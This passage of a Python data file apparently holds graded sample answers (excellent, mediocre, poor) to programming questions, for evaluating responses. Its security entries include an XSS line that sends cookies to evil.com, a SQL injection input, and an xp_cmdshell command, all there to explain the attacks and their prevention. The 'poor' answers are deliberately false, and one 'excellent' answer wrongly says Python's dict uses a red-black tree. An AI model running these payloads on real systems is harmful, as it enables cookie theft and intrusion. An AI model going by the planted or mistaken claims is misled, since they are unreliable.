        "Docker creates virtual networks for container isolation and communication.\n\nDefault networks:\n- bridge: default for standalone containers. Containers can reach each other by IP.\n- host: container shares host network stack (Linux only)\n- none: no networking\n\nUser-defined bridge (recommended):\ndocker network create my-net\ndocker run --network my-net --name db postgres\ndocker run --network my-net --name app myapp\n# 'app' can reach 'db' by hostname: postgresql://db:5432/mydb",
        "Container communication patterns:\n1. Same network — use container name as hostname\n2. Exposed ports — access from host: docker run -p 8080:80 nginx → localhost:8080\n3. Docker Compose — all services on same network by default\n\nDocker Compose networking:\nservices:\n  web:\n    ports:\n      - '8000:8000'  # expose to host\n  db:\n    # not exposed to host — only reachable by 'web'",
        "Port binding: -p host_port:container_port\ndocker run -p 5432:5432 postgres   # PostgreSQL accessible on host\ndocker run -p 8080:80 nginx        # nginx port 80 → host port 8080\n\nInspect network:\ndocker network inspect bridge\ndocker inspect <container> | jq '.[0].NetworkSettings'",
        "DNS in Docker:\nUser-defined networks provide automatic DNS resolution.\nContainers address each other by service name.\n\ndocker run --network app-net --name redis redis\ndocker run --network app-net myapp\n# myapp connects to redis:6379 — Docker DNS resolves 'redis'",
    ],
    mediocre=[
        "Docker containers on the same network can communicate using container names.",
        "Use -p flag to expose ports and --network to put containers on the same network.",
        "Docker Compose handles networking automatically for services defined together.",
    ],
    poor=[
        "Docker containers can't communicate with each other without a proxy.",
        "All containers share the same network by default.",
        "Use the container's IP address, which is always 127.0.0.1.",
    ],
)

# ── Git ───────────────────────────────────────────────────────────────────────
add(
    "Explain the difference between git merge and git rebase",
    "Is the distinction accurate with implications for history?",
    excellent=[
        "git merge creates a merge commit joining two branches, preserving full history.\nResult: shows diverging branches clearly.\n\ngit rebase replays commits on top of target branch, creating linear history.\nResult: clean linear log, but rewrites commit SHAs.\n\nGolden rule: never rebase shared/public branches — rewrites history others depend on.",
        "Merge vs Rebase for feature branch:\n\n# Merge: keeps branch history\ngit checkout main\ngit merge feature  # creates merge commit M\n\n# Rebase: linear history\ngit checkout feature\ngit rebase main     # replay feature commits on top of main\ngit checkout main\ngit merge feature   # now fast-forward, no merge commit",
        "When to use each:\nMerge: integrating completed feature into main, merging hotfixes, when branch history matters.\nRebase: cleaning up local commits before PR, keeping feature branch current with main.\n\nInteractive rebase for cleanup:\ngit rebase -i HEAD~3  # edit/squash/reorder last 3 commits",
        "Squash merge — middle ground:\ngit merge --squash feature  # collapses all feature commits into one staged change\ngit commit -m 'feat: implement user auth'\n# Clean main history, but feature branch history lost",
    ],
    mediocre=[
        "Merge combines two branches and creates a merge commit. Rebase moves your branch on top of another branch for a cleaner history.",
        "Rebase makes history linear, merge keeps the branching structure. Rebase rewrites commits.",
        "Use rebase for local cleanup, use merge for integrating finished features.",
    ],
    poor=[
        "Rebase is more dangerous than merge so you should always use merge.",
        "They do the same thing but rebase is faster.",
        "Use merge for small changes and rebase for large ones.",
    ],
)

add(
    "What is git stash and when would you use it?",
    "Is git stash explained correctly with practical use cases?",
    excellent=[
        "git stash saves your uncommitted changes (staged and unstaged) to a stack, giving you a clean working directory.\n\nCommon workflow:\ngit stash          # save current changes\ngit checkout main  # switch branches without committing\ngit pull           # get latest\ngit checkout -     # back to feature branch\ngit stash pop      # restore changes\n\nOther commands:\ngit stash list              # see all stashes\ngit stash show -p stash@{0} # show diff of a stash\ngit stash drop              # delete top stash\ngit stash clear             # delete all stashes",
        "Use cases:\n1. Interrupted work: need to urgently fix a bug on another branch\n2. Dirty working tree: want to pull but have local changes\n3. Experiment cleanup: stash to test without changes\n\ngit stash push -m 'WIP: auth form validation'  # named stash\ngit stash push --include-untracked  # also stash new files\ngit stash branch feature-backup stash@{0}  # create branch from stash",
        "Stash is a stack (LIFO):\ngit stash      # push to stack\ngit stash pop  # apply and remove top\ngit stash apply stash@{1}  # apply without removing\n\nWarning: git stash does NOT stash untracked new files by default.\nUse: git stash -u (--include-untracked)",
        "Alternative to stash — WIP commit:\ngit add -A\ngit commit -m 'WIP: do not merge'\n# do other work\ngit reset HEAD~1  # undo WIP commit, restore changes\n\nPreference: WIP commits are visible in log; stash is easy to forget.",
    ],
    mediocre=[
        "git stash saves your current changes temporarily so you can switch branches.",
        "Use git stash when you need a clean working directory but don't want to commit yet.",
        "git stash saves changes, git stash pop restores them.",
    ],
    poor=[
        "git stash deletes your uncommitted changes permanently.",
        "You should commit instead of stashing because stash is unreliable.",
        "git stash is the same as git reset.",
    ],
)

# ── REST API Design ───────────────────────────────────────────────────────────
add(
    "What are the main HTTP methods and when should each be used?",
    "Are the HTTP methods described accurately with correct use cases?",
    excellent=[
        "GET    — Retrieve. Safe, idempotent, cacheable. GET /users/42\nPOST   — Create. Not idempotent. POST /users → 201\nPUT    — Replace entirely. Idempotent. PUT /users/42\nPATCH  — Partial update. PATCH /users/42 {email: ...}\nDELETE — Remove. Idempotent. DELETE /users/42 → 204\nHEAD   — Like GET but no body (check existence/headers)\nOPTIONS — CORS preflight, returns allowed methods",
        "Idempotent: repeating the request has the same effect as one call.\nGET, PUT, DELETE, HEAD — idempotent\nPOST, PATCH — not idempotent\n\nSafe: no side effects.\nGET, HEAD — safe\nAll others — not safe\n\nDesign rule: if operation is idempotent by nature, prefer PUT/DELETE over POST.",
        "RESTful naming:\nPOST   /articles        — create article\nGET    /articles        — list articles\nGET    /articles/42     — get article 42\nPUT    /articles/42     — replace article 42\nPATCH  /articles/42     — update fields of article 42\nDELETE /articles/42     — delete article 42\nPOST   /articles/42/publish — action that doesn't fit CRUD",
        "Response codes per method:\nGET    → 200 OK\nPOST   → 201 Created (+ Location: /resource/id header)\nPUT    → 200 OK or 204 No Content\nPATCH  → 200 OK\nDELETE → 204 No Content",
    ],
    mediocre=[
        "GET retrieves data, POST creates data, PUT updates data, DELETE removes data.",
        "GET=read, POST=create, PUT=update, DELETE=delete. PATCH is for partial updates.",
        "Use GET for reading and POST for writing. PUT and DELETE are for updating and removing.",
    ],
    poor=[
        "GET is for getting data from a server, POST is for posting data to it. There are no other important methods.",
        "You should always use POST for all operations because it is the most secure.",
        "DELETE is dangerous and should not be used in production APIs.",
    ],
)

add(
    "How would you design a RESTful API for a blog system?",
    "Is the API design idiomatic REST with correct resource modeling?",
    excellent=[
        "Resources: Post, Comment, User, Tag\n\nPosts:\nGET    /posts              — list (paginated, filterable)\nPOST   /posts              — create\nGET    /posts/{id}         — get post\nPUT    /posts/{id}         — replace post\nPATCH  /posts/{id}         — partial update\nDELETE /posts/{id}         — delete\nPOST   /posts/{id}/publish — action\n\nComments (nested resource):\nGET    /posts/{id}/comments\nPOST   /posts/{id}/comments\nDELETE /posts/{id}/comments/{cid}\n\nVersion the API: /api/v1/posts",
        "Pagination: GET /posts?page=1&limit=20\nFiltering: GET /posts?author=alice&tag=python&status=published\nSorting: GET /posts?sort=-created_at (- = descending)\nSearch: GET /posts?q=machine+learning\n\nResponse format:\n{\n  'data': [...],\n  'meta': { 'total': 100, 'page': 1, 'limit': 20, 'pages': 5 },\n  'links': { 'next': '/posts?page=2', 'prev': null }\n}",
        "Authentication:\n- POST /auth/login → JWT token\n- POST /auth/refresh → new access token\n- DELETE /auth/logout → invalidate refresh token\n\nAuthorization:\n- Posts: author and admin can edit/delete\n- Comments: author, post author, admin\n- Use 403 Forbidden (not 401) when authenticated but not authorized",
        "Error responses:\n{\n  'error': {\n    'code': 'VALIDATION_ERROR',\n    'message': 'Request validation failed',\n    'details': [\n      { 'field': 'title', 'message': 'Title is required' }\n    ]\n  }\n}\n\nAlways return consistent error format. Include request ID for debugging.",
    ],
    mediocre=[
        "Create endpoints for posts, comments, and users. Use GET for reading and POST for creating.",
        "/posts, /posts/:id, /posts/:id/comments — these are the main endpoints.",
        "Use nouns for endpoints and HTTP methods to indicate the action.",
    ],
    poor=[
        "POST /createPost, POST /deletePost, POST /updatePost — use POST for all operations.",
        "Just create a /api endpoint that handles all requests.",
        "Blog APIs don't need versioning.",
    ],
)

# ── System Design ─────────────────────────────────────────────────────────────
add(
    "What is horizontal scaling vs vertical scaling?",
    "Is the distinction accurate with tradeoffs explained?",
    excellent=[
        "Vertical (scale up): more powerful machine — bigger CPU, more RAM, faster storage.\n+ No architecture changes\n+ Low latency (no network between components)\n- Hardware ceiling, single point of failure\n- Diminishing returns (price grows faster than performance)\n\nHorizontal (scale out): more machines, distribute load.\n+ Virtually unlimited scale\n+ Fault tolerant (one node fails, others continue)\n+ Linear cost scaling\n- Requires stateless design, load balancer, distributed state",
        "Database scaling:\nVertical: upgrade DB server (simplest, works well up to a point)\nRead replicas: horizontal reads, vertical writes\nSharding: partition data across multiple DBs (horizontal writes — complex)\nCaching: Redis/Memcached reduces DB load\n\nApp tier:\nHorizontal almost always preferred — stateless services behind load balancer",
        "Real-world example:\nStartup: vertical (one $500/month server)\nGrowth: read replicas + horizontal app servers\nScale: sharded DB, CDN, queue-based processing, microservices\n\nAWS: t3.micro → t3.xlarge (vertical) vs t3.micro × 10 (horizontal)",
        "CAP theorem relevance:\nHorizontal scaling introduces network partitions.\nMust choose: Consistency or Availability during partition.\nSQL DBs: prioritize C, hard to scale horizontally.\nNoSQL (Cassandra, DynamoDB): prioritize A, designed for horizontal scale.",
    ],
    mediocre=[
        "Vertical scaling means making a server more powerful. Horizontal scaling means adding more servers.",
        "Scale up = bigger machine, scale out = more machines. Horizontal is better for large systems.",
        "Horizontal scaling provides better fault tolerance. Vertical is simpler to implement.",
    ],
    poor=[
        "Horizontal scaling means making the server wider and vertical means making it taller.",
        "Vertical scaling is always better because it keeps all data in one place.",
        "Just use cloud services, they scale automatically.",
    ],
)

add(
    "Explain how a content delivery network (CDN) works",
    "Is the CDN explanation correct and practical?",
    excellent=[
        "A CDN caches static assets (images, JS, CSS, video) at edge servers close to users, reducing latency and origin server load.\n\nRequest flow without CDN:\nUser (Tokyo) → Origin server (Virginia) → 200ms round trip\n\nWith CDN:\nUser (Tokyo) → Edge node (Tokyo) → cache hit → 10ms\n              → cache miss → fetch from origin, cache for next user\n\nPurpose-built for:\n- Static assets (images, CSS, JS)\n- Large file downloads\n- Video streaming (HLS)\n- API acceleration (some CDNs)",
        "Cache headers control CDN behavior:\nCache-Control: max-age=86400, public  — cache for 1 day\nCache-Control: no-cache                — always revalidate\nETag: 'abc123'                         — fingerprint for conditional requests\n\nCache invalidation:\n- Content-addressed URLs: /assets/app.a1b2c3.js (change hash when file changes)\n- CDN purge API: invalidate specific paths on deploy\n\nProviders: CloudFront (AWS), Akamai, Fastly, Cloudflare",
        "CDN for dynamic content:\nModern CDNs offer edge computing (Cloudflare Workers, Lambda@Edge).\nRun code at the edge: A/B testing, auth, personalization without roundtrip to origin.\n\nGeographic routing:\nAnyCast DNS routes users to nearest PoP (Point of Presence).\n100+ global PoPs for major CDNs.",
        "When to use CDN:\n✓ Serving images, videos, static assets\n✓ Global user base\n✓ High traffic (offload origin)\n✓ DDoS protection (absorb attack at edge)\n✗ Highly personalized, uncacheable responses",
    ],
    mediocre=[
        "A CDN caches content at servers around the world so users get faster responses from nearby servers.",
        "CDNs store copies of your static files globally. When a user requests a file, they get it from the nearest CDN node.",
        "Use a CDN for static files like images and CSS to reduce load on your server.",
    ],
    poor=[
        "A CDN is a database that stores content permanently.",
        "CDNs are only useful for video streaming.",
        "CDNs are expensive and only necessary for very large companies.",
    ],
)

# ── Security ──────────────────────────────────────────────────────────────────
add(
    "Explain SQL injection and how to prevent it",
    "Is the SQL injection explanation correct with concrete prevention measures?",
    excellent=[
        "SQL injection: user input inserted directly into SQL changes the query's logic.\n\nVulnerable:\nquery = f\"SELECT * FROM users WHERE email = '{email}'\"\n# email = ' OR 1=1 --  → returns ALL users\n\nPrevention:\n1. Parameterized queries:\n   cursor.execute('SELECT * FROM users WHERE email = %s', (email,))\n2. ORM (SQLAlchemy, Django) — parameterizes automatically\n3. Stored procedures\n4. Input validation (allowlist)\n5. Least privilege (DB user has only needed rights)",
        "Attack types:\n- In-band SQLi: data returned in app response\n- Blind SQLi: true/false inference (no visible output)\n- Time-based: SLEEP() to infer data\n- Error-based: extract data from error messages\n\nSQL Server: EXEC xp_cmdshell 'net user' — can execute OS commands!\n\nDefense in depth:\n- Parameterized queries (primary)\n- WAF to block patterns\n- Error pages that don't reveal DB structure\n- Monitor for unusual query patterns",
        "OWASP #1 for years. Still extremely common.\n\nSafe code in Python:\n# SQLAlchemy ORM — safe\nuser = db.query(User).filter(User.email == email).first()\n\n# SQLAlchemy core — safe (parameterized)\nresult = db.execute(text('SELECT * FROM users WHERE email = :email'), {'email': email})\n\n# UNSAFE — never do this:\nresult = db.execute(f'SELECT * FROM users WHERE email = {email}')",
        "Testing for SQLi:\n- Manual: append ', \", --, ;, OR 1=1\n- Automated: sqlmap tool\n- In code review: grep for string concatenation in SQL\n- Static analysis: bandit (Python), SonarQube",
    ],
    mediocre=[
        "SQL injection is when attackers put SQL code in form fields. Use parameterized queries to prevent it.",
        "Validate user input and use prepared statements instead of concatenating strings into SQL queries.",
        "Never concatenate user input directly into SQL. Use query parameters instead.",
    ],
    poor=[
        "SQL injection is prevented by encrypting your database.",
        "Use strong passwords to prevent SQL injection attacks.",
        "SQL injection only affects MySQL databases.",
    ],
)

add(
    "What is XSS and how do you prevent it in a web application?",
    "Is the XSS explanation correct with practical prevention techniques?",
    excellent=[
        "XSS (Cross-Site Scripting): attacker injects malicious scripts into pages viewed by other users.\n\nTypes:\n- Stored XSS: script saved in DB, served to all users\n- Reflected XSS: script in URL parameter, reflected back\n- DOM-based: client-side JS writes attacker input to DOM\n\nImpact: steal cookies/tokens, keylogging, defacement, redirects.\n\nExample:\nComment: <script>fetch('evil.com/steal?c='+document.cookie)</script>",
        "Prevention:\n1. Output encoding (primary): encode HTML entities before rendering\n   &  → &amp;   <  → &lt;   >  → &gt;\n2. Content Security Policy header:\n   Content-Security-Policy: default-src 'self'; script-src 'self'\n3. HTTPOnly cookies: prevent JS access to auth cookies\n4. Use modern frameworks (React, Vue) — auto-escape by default\n5. Sanitize rich text with allowlist (DOMPurify)",
        "React auto-escapes JSX:\n// Safe — React escapes the string\n<div>{userInput}</div>\n\n// UNSAFE — bypasses escaping\n<div dangerouslySetInnerHTML={{__html: userInput}} />\n\nJinja2 (Python):\n{{ user_input }}      {# auto-escaped #}\n{{ user_input | safe }} {# UNSAFE — disables escaping #}",
        "CSP blocks most XSS even if injection occurs:\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' cdn.trusted.com;\n  object-src 'none';\n\nReport-only mode for testing:\nContent-Security-Policy-Report-Only: ...; report-uri /csp-report",
    ],
    mediocre=[
        "XSS is when attackers inject scripts into web pages. Validate and escape all user input.",
        "Use HTML encoding to prevent XSS. Modern frameworks like React escape by default.",
        "Never render user input as HTML directly. Always encode it first.",
    ],
    poor=[
        "XSS is only a problem for PHP websites.",
        "Use HTTPS to prevent XSS attacks.",
        "XSS stands for Extra Secure Script.",
    ],
)

# ── TypeScript ────────────────────────────────────────────────────────────────
add(
    "What is the difference between interface and type in TypeScript?",
    "Is the distinction between interface and type accurate?",
    excellent=[
        "Both define shapes, but:\ninterface: declaration merging, better for public APIs\ntype: unions, intersections, mapped types\n\ninterface User { name: string; }\ninterface User { age: number; }  // merged: both fields\n\ntype ID = string | number;  // only possible with type\ntype Admin = User & { role: 'admin' };  // intersection",
        "Use interface when:\n- Defining object shapes that will be implemented by classes\n- You want declaration merging (augmenting third-party types)\n- Public library APIs\n\nUse type when:\n- Union types: type Status = 'pending' | 'done' | 'failed'\n- Tuple types: type Point = [number, number]\n- Utility types: type Partial<T> = { [K in keyof T]?: T[K] }\n- Conditional types",
        "In practice the difference is minimal for most object types.\nTeam convention matters more than the technical difference.\n\nRule many teams follow:\n- interface for objects/classes\n- type for everything else (unions, primitives, functions, utility types)\n\nfunction process(handler: (x: number) => void): void  // type alias for function",
        "extends vs &:\ninterface Admin extends User { role: string; }\ntype Admin = User & { role: string; }  // roughly equivalent\n\ninterface errors are usually cleaner because TypeScript shows the interface name in errors rather than expanding the full type.",
    ],
    mediocre=[
        "They are mostly interchangeable. Interfaces can be extended with extends, types can use unions with |.",
        "interface is used for object shapes. type can also do unions and intersections.",
        "Use interface for objects and classes. Use type for union types.",
    ],
    poor=[
        "Interfaces are for classes, types are for functions.",
        "They are exactly the same. Just pick one and be consistent.",
        "Types are faster because TypeScript compiles them differently.",
    ],
)

add(
    "Explain TypeScript utility types: Partial, Required, Pick, Omit",
    "Are the utility types explained correctly with examples?",
    excellent=[
        "Partial<T>: makes all properties optional\ntype UpdateUser = Partial<User>;  // all fields optional for PATCH\n\nRequired<T>: makes all properties required (opposite of Partial)\ntype FullUser = Required<User>;  // no optional fields\n\nPick<T, K>: subset of properties\ntype UserPreview = Pick<User, 'id' | 'name'>;\n\nOmit<T, K>: all properties except K\ntype UserWithoutPassword = Omit<User, 'password'>;\n\nAll are built from mapped types internally.",
        "Real-world usage:\ninterface User { id: number; name: string; email: string; password: string; }\n\n// API responses — no password\ntype PublicUser = Omit<User, 'password'>;\n\n// PATCH endpoint — all optional\ntype UpdateUserDto = Partial<Omit<User, 'id'>>;\n\n// Listing — minimal fields\ntype UserSummary = Pick<User, 'id' | 'name'>;\n\n// DB model — all required\ntype UserRow = Required<User>;",
        "Other useful utility types:\nReadonly<T>: immutable object\nRecord<K, V>: object with known keys: Record<string, number>\nReturnType<F>: extract return type of a function\nParameters<F>: extract parameter tuple\nNonNullable<T>: remove null and undefined\nExclude<T, U>: members of T not in U",
        "Composing utility types:\n// Updatable DTO: all optional except id required\ntype UpdateDto<T extends { id: unknown }> =\n  Required<Pick<T, 'id'>> & Partial<Omit<T, 'id'>>;\n\nfunction updateUser(dto: UpdateDto<User>) { ... }",
    ],
    mediocre=[
        "Partial makes all fields optional, Required makes all fields required, Pick selects fields, Omit removes fields.",
        "They are built-in TypeScript helpers for creating new types from existing ones.",
        "Partial<T> is useful for update operations where not all fields are required.",
    ],
    poor=[
        "These are JavaScript features, not TypeScript-specific.",
        "Partial means the type is partially defined and might cause runtime errors.",
        "Use any instead of these complex utility types.",
    ],
)

# ── React ─────────────────────────────────────────────────────────────────────
add(
    "Explain the difference between React useState and useReducer",
    "Is the distinction between the hooks explained correctly?",
    excellent=[
        "useState: simple, independent state.\nconst [count, setCount] = useState(0);\nsetCount(c => c + 1);\n\nuseReducer: complex state with related values or actions.\nconst reducer = (state, action) => {\n  switch(action.type) {\n    case 'inc': return { count: state.count + 1 };\n    case 'reset': return { count: 0 };\n    default: return state;\n  }\n};\nconst [state, dispatch] = useReducer(reducer, { count: 0 });\ndispatch({ type: 'inc' });",
        "When to prefer useReducer:\n- 3+ related state values that change together\n- Next state depends on previous in complex ways\n- Many different actions on the same state\n- Want to extract state logic and test it independently\n\nReducer is a pure function — easy to unit test without rendering:\nexpect(reducer({count:0}, {type:'inc'})).toEqual({count:1})",
        "useReducer + Context = lightweight state management:\nconst StateContext = createContext();\nfunction Provider({children}) {\n  const [state, dispatch] = useReducer(reducer, initial);\n  return <StateContext.Provider value={{state, dispatch}}>\n    {children}\n  </StateContext.Provider>;\n}\n// Replaces simple Redux use cases",
        "Functional setState update (avoids stale closure):\n// Bug: stale count in closure\nsetTimeout(() => setCount(count + 1), 1000);\n\n// Correct: function form always has latest state\nsetTimeout(() => setCount(c => c + 1), 1000);\n\nuseReducer actions always receive latest state — no stale closure issue.",
    ],
    mediocre=[
        "useState is simpler, useReducer is for complex state. useReducer takes a reducer function and initial state.",
        "Use useState for simple values and useReducer when you have complex state with multiple actions.",
        "useReducer is similar to Redux. Dispatch actions to update state.",
    ],
    poor=[
        "useReducer is the same as useState but slower because it goes through a reducer.",
        "You should always use useReducer because it is more powerful.",
        "useState is deprecated. Use useReducer instead.",
    ],
)

add(
    "What are React hooks rules and why do they exist?",
    "Are the rules of hooks explained correctly with the underlying reason?",
    excellent=[
        "Rules of hooks:\n1. Only call hooks at the top level (not inside loops, conditions, or nested functions)\n2. Only call hooks from React function components or custom hooks\n\nWhy: React relies on the call order of hooks to associate state with the right hook on every render.\n\nBad:\nif (condition) {\n  const [x, setX] = useState(0);  // ❌ conditional hook\n}\n\nReact tracks hooks by order: Hook 1, Hook 2, Hook 3...\nIf you skip hooks conditionally, the order changes → wrong state assigned.",
        "What happens if you break the rules:\nRender 1: useState, useEffect, useState  → order: 1,2,3\nRender 2 (condition false): useState, useState  → order: 1,2\n→ Hook 2 now gets state that belonged to Hook 3\n\nESLint plugin enforces rules:\nnpm install eslint-plugin-react-hooks\n\nRules:\n'react-hooks/rules-of-hooks': 'error'\n'react-hooks/exhaustive-deps': 'warn'",
        "Custom hooks must start with 'use' — convention that allows lint tools to check rules:\nfunction useLocalStorage(key, initialValue) {\n  const [value, setValue] = useState(() => {\n    const stored = localStorage.getItem(key);\n    return stored ? JSON.parse(stored) : initialValue;\n  });\n  // ...\n  return [value, setValue];\n}",
        "Hooks replaced class lifecycle methods:\ncomponentDidMount → useEffect(() => {}, [])\ncomponentDidUpdate → useEffect(() => {}, [dep])\ncomponentWillUnmount → useEffect(() => () => cleanup(), [])\nthis.setState → useState / useReducer",
    ],
    mediocre=[
        "Hooks can only be used in functional components. Don't use them inside loops or conditions.",
        "The two rules are: only at top level and only in React functions. This ensures consistent hook order.",
        "React tracks hooks by order so you must call them the same way every render.",
    ],
    poor=[
        "You can use hooks anywhere in your code, not just React components.",
        "The rules of hooks are optional guidelines, not strict requirements.",
        "Hooks only work with class components.",
    ],
)

# ── Linux / Shell ─────────────────────────────────────────────────────────────
add(
    "Write a bash script to find all files larger than 100MB in a directory",
    "Is the bash script correct and does it handle edge cases?",
    excellent=[
        "#!/bin/bash\nDIR=\"${1:-.}\"  # default to current directory\n\nif [ ! -d \"$DIR\" ]; then\n  echo \"Error: '$DIR' is not a directory\" >&2\n  exit 1\nfi\n\nfind \"$DIR\" -type f -size +100M -printf '%s\\t%p\\n' | \\\n  sort -rn | \\\n  awk '{printf \"%.0f MB\\t%s\\n\", $1/1024/1024, $2}'",
        "#!/bin/bash\n# Usage: ./find_large.sh [directory] [size_MB]\nDIR=\"${1:-.}\"\nSIZE=\"${2:-100}\"\n\necho \"Files larger than ${SIZE}MB in $DIR:\"\necho \"---\"\nfind \"$DIR\" -type f -size +\"${SIZE}\"M -exec du -sh {} + 2>/dev/null | \\\n  sort -rh | \\\n  head -20",
        "# One-liner version:\nfind . -type f -size +100M -ls 2>/dev/null | sort -k7 -rn\n\n# With GNU find:\nfind . -type f -size +100M -printf '%s %p\\n' | \\\n  numfmt --field=1 --to=iec | sort -rh",
        "#!/bin/bash\n# Cross-platform (works on macOS and Linux)\nfind \"${1:-.}\" -type f | while IFS= read -r f; do\n  size=$(wc -c < \"$f\" 2>/dev/null)\n  if [ \"$size\" -gt 104857600 ]; then  # 100 * 1024 * 1024\n    echo \"$((size/1048576))MB $f\"\n  fi\ndone | sort -rn",
    ],
    mediocre=[
        "find /directory -size +100M -type f\nThis finds all files larger than 100MB.",
        "Use: find . -type f -size +100M\nYou can add -ls to show details.",
        "find . -type f -size +100M | xargs ls -lh",
    ],
    poor=[
        "ls -la | grep 100MB",
        "Use the du command to find large files: du -sh *",
        "dir /S /O-S > files.txt",
    ],
)

add(
    "What does the chmod command do and explain common permission modes",
    "Is the permission system correctly explained?",
    excellent=[
        "chmod changes file permissions. Linux uses 3 octets: owner / group / others\n\nOctal:  r=4, w=2, x=1\n755 → owner:rwx(7), group:r-x(5), others:r-x(5)\n644 → owner:rw-(6), group:r--(4), others:r--(4)\n600 → owner:rw-(6), group:---(0), others:---(0)\n\nCommon:\n644 — web files (owner writes, all read)\n755 — executables/dirs\n600 — private keys (SSH)\n777 — everyone everything (avoid in production)",
        "Symbolic mode:\nchmod u+x file       # add execute for owner\nchmod g-w file       # remove write for group\nchmod a+r file       # add read for all\nchmod o-rwx file     # remove all for others\nchmod u=rw,go=r file # set exact permissions\n\nOctal vs symbolic:\nchmod 755 = chmod u=rwx,go=rx\nchmod 644 = chmod u=rw,go=r",
        "Special bits:\nSetUID (4000): s in owner execute — runs as file owner\nSetGID (2000): s in group execute — new files inherit group\nSticky (1000): t in other execute — only owner can delete\n\nchmod 1777 /tmp   # sticky bit on shared dir\nchmod 4755 /usr/bin/passwd  # setuid for password program",
        "Directory permissions:\nRead (r): list contents (ls)\nWrite (w): create/delete files inside\nExecute (x): traverse (cd into it)\n\nTo access a file deep in a path, need x on every parent directory.\nchmod -R 755 /var/www  # recursive change",
    ],
    mediocre=[
        "chmod changes file permissions. 755 gives owner full permissions and others read and execute.",
        "Permissions are owner/group/others. Each has read(4), write(2), execute(1). Add them for the octal value.",
        "chmod 644 for files, chmod 755 for directories is a common setup.",
    ],
    poor=[
        "chmod 777 gives everyone full permissions and is the most common setting.",
        "chmod changes the file owner.",
        "755 is the maximum permission level and 644 is read only.",
    ],
)

# ── Cloud Computing ───────────────────────────────────────────────────────────
add(
    "What is the difference between IaaS, PaaS, and SaaS?",
    "Are the three cloud service models explained accurately?",
    excellent=[
        "IaaS — Infrastructure: virtual machines, storage, networking.\nYou manage: OS, middleware, runtime, app, data.\nExamples: AWS EC2, Azure VMs, GCP Compute Engine\n\nPaaS — Platform: managed runtime, deploy code only.\nYou manage: app and data.\nExamples: Heroku, AWS Elastic Beanstalk, Azure App Service\n\nSaaS — Software: complete application, just configure.\nYou manage: settings and data inside the app.\nExamples: Gmail, Salesforce, GitHub, Slack",
        "Pizza analogy:\nIaaS = you have a kitchen (cloud gives hardware) — cook everything yourself\nPaaS = you have pre-made dough — focus on toppings (your app)\nSaaS = delivery pizza — just eat it\n\nControl tradeoff:\n         You manage            Cloud manages\nIaaS     App+OS+Middleware     Hardware\nPaaS     App only             Hardware+OS+Runtime\nSaaS     Config only          Everything",
        "When to choose:\nIaaS: need full control, custom OS config, specific hardware, compliance requirements\nPaaS: just want to deploy code, auto-scaling, managed DBs (RDS, Cloud SQL)\nSaaS: off-the-shelf needs, want zero maintenance\n\nHybrid common: SaaS for email, PaaS for your app, IaaS for legacy systems",
        "CaaS (Containers as a Service) is emerging between IaaS and PaaS:\nKubernetes-managed containers, you provide images.\nExamples: EKS, GKE, AKS, Cloud Run\n\nFaaS (Functions as a Service) is serverless PaaS:\nAWS Lambda, Azure Functions, Cloud Functions.",
    ],
    mediocre=[
        "IaaS is virtual machines, PaaS is a platform to run apps without managing servers, SaaS is software you use over the internet.",
        "IaaS gives you infrastructure, PaaS gives you a platform, SaaS gives you software. Each has less management overhead.",
        "The more letters in the name, the less you manage.",
    ],
    poor=[
        "They are three different pricing models for cloud services.",
        "SaaS is better than IaaS because you get more for your money.",
        "IaaS is only for large enterprises.",
    ],
)

add(
    "Explain AWS S3 and when to use it vs a database",
    "Is the S3 vs database distinction explained correctly?",
    excellent=[
        "S3 (Simple Storage Service): object storage for arbitrary files.\n- Store any file (images, videos, backups, logs, ML datasets)\n- 5TB max object size, unlimited total storage\n- Accessed via URL: https://bucket.s3.amazonaws.com/key\n- Durable: 99.999999999% (11 nines)\n- Not a filesystem — no partial updates, no locking\n\nUse S3 for: user uploads, static assets, data lake, backups, logs",
        "S3 vs Database:\n\nS3:\n+ Store large blobs (images, videos, documents)\n+ Cost-effective for large files ($0.023/GB vs $0.10+/GB for RDS)\n+ CDN-friendly (serve directly via CloudFront)\n- No querying (can't SELECT WHERE)\n- No transactions\n- Eventual consistency (though now read-after-write consistent)\n\nDatabase:\n+ Queryable, relational, transactional\n+ Fast lookups on indexed columns\n- Store file path/URL in DB, file itself in S3",
        "Common pattern:\nDB row: { id, user_id, filename, s3_url, size, created_at }\nS3: actual file at s3://bucket/uploads/user123/photo.jpg\n\nUpload flow:\n1. Client requests presigned URL from your API\n2. API generates presigned PUT URL (valid 5 min)\n3. Client uploads directly to S3 (bypasses your server)\n4. Client notifies API of completion\n5. API saves S3 URL to DB",
        "S3 features:\n- Versioning: keep old versions of objects\n- Lifecycle rules: auto-move to Glacier after 90 days\n- Event notifications: trigger Lambda on upload\n- Static website hosting: serve HTML directly\n- Server-side encryption: SSE-S3, SSE-KMS\n- Access control: bucket policies, IAM, presigned URLs",
    ],
    mediocre=[
        "S3 is for storing files like images and videos. Use a database for structured data that you need to query.",
        "Store file paths in your database and actual files in S3. S3 is cheaper for large files.",
        "S3 is object storage. It's good for backups and static assets.",
    ],
    poor=[
        "S3 is a database provided by Amazon. Use it instead of MySQL for better performance.",
        "Always use S3 because databases are slower.",
        "S3 can only store images and videos.",
    ],
)

# ── Data Structures ───────────────────────────────────────────────────────────
add(
    "What is a binary search tree and what are its time complexities?",
    "Is the BST explained correctly with accurate time complexity?",
    excellent=[
        "A BST is a binary tree where left child < parent < right child.\n\nOperations (balanced BST):\n- Search: O(log n)\n- Insert: O(log n)\n- Delete: O(log n)\n\nWorst case (degenerate — sorted insertion → linear tree):\n- All operations: O(n)\n\nBalanced BSTs (self-balancing) maintain O(log n):\n- AVL tree: strict balance factor\n- Red-Black tree: used in Python's dict, Java's TreeMap",
        "BST operations:\nSearch: start at root, go left if target < node, right if >, stop if equal.\nInsert: search until null, insert there.\nDelete: 3 cases — leaf (remove), one child (replace), two children (replace with inorder successor).\n\nInorder traversal visits nodes in sorted order — useful property for range queries.\n\nPython: use sortedcontainers.SortedList or heapq for most practical use cases.",
        "BST vs Hash Table:\n            BST          Hash Table\nSearch      O(log n)     O(1) avg\nInsert      O(log n)     O(1) avg\nDelete      O(log n)     O(1) avg\nRange query O(log n + k) O(n) scan\nOrdered     Yes          No\n\nUse BST when you need ordered operations (floor, ceiling, range).",
        "Common BST problems:\n- Validate BST: inorder traversal should be strictly increasing\n- Lowest common ancestor\n- Kth smallest element\n- Serialize/deserialize\n\nPython heapq for priority queue (min-heap):\nimport heapq\nheap = []\nheapq.heappush(heap, 3)\nheapq.heappop(heap)  # O(log n)",
    ],
